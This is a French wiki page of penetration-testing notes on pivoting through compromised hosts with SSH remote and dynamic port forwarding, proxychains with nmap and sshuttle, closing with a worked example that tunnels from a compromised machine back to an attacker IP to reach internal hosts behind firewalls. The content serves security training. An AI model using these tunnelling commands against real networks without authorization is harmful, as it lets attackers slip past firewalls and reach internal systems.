---
title: Proxy SSH
permalink: /Proxy_SSH/
---

Remote Port Forwarding with SSH
-------------------------------

On a compromis l'ĥôte 10.3.3.99 et on cherche à créer un tunnel SSH avec l'attaquant 192.168.30.229. Il suffit de lancer la commande suivante sur 10.3.3.99

``` bash
ssh -f -N -p 80 192.168.30.229 -R 8080:10.3.3.99:80
```

Ceci permettra à l'attaquant d'accéder 10.3.3.99:80 en accédant à localhost:8080.

La commande générique est:

``` bash
ssh -f -N -p <authorized port> <attacker ip> -R <port to bind on attacker>:<target ip>:<target port>
```

Dynamic Port Forwarding with SSH
--------------------------------

Ceci permet se mettre un *dynamic port forwarding* vers 192.168.31.251:

``` bash
ssh -f -N -D 8888 root@192.168.31.251
```

La commande générique est:

``` bash
ssh -f -N -D <local proxy port> <target>
```

On peut ensuite utiliser localhost:8888 en tant que proxy SOCKS (avec proxychains ou le navigateur web).

Outils
------

### Proxychains

Utiliser [Proxychains-NG](https://github.com/rofl0r/proxychains-ng) avec nmap. Il est nécessaire de faire des *Full Connect Scan*:

``` bash
proxychains nmap -sT -F -sV -A -O -PN 10.1.1.246
```

### SSHuttle

L'outil [sshuttle](https://github.com/apenwarr/sshuttle), permet de mettre facilement en place un tunnel SSH:

``` bash
./sshuttle -r sean@192.168.31.251 10.0.0.0/8 -vv
```

### Autres

[EgressBuster](https://github.com/trustedsec/egressbuster)

Exemple Complet
---------------

We want to access 10.3.3.99 on port 80 with firefox. On cherche a accéder à 10.3.3.99:80 avec firefox.

Le réseau est le suivant:

``` bash
Attacker [192.168.30.229]
Firewall [192.168.31.251]

Sean-Desktop [10.1.1.246]
Firewall [10.1.1.251]

Bill [10.3.3.44]
Jim [10.3.3.99]
```

On utilise **sshuttle** pour accéder au réseau 10.1.1.0/24

``` bash
~/utils/sshuttle -r sean@192.168.31.251 10.1.1.0/24 -vv
```

Ensuite on compromet Bill et on met en place un remote port forwarding jusqu'à l'attaquant pour pouvoir accéder au port 22 sur Bill depuis la machine de l'attaquant:

``` bash
ssh -f -N -R 2222:127.0.0.1:22 -p 80 root@192.168.30.229
```

On mets ensuite en place un *dynamic port forwarding*:

``` bash
ssh -f -N -D 8080 -p2222 bill@127.0.0.1
```

On peut ensuite configurer iceweasel pour utiliser localhost:8080 comme proxy SOCKS.

Resources
---------

-   [Dynamic Port Forwarding](http://netsec.ws/?p=278)

[Category:Méthodologies](/Category:Méthodologies "wikilink")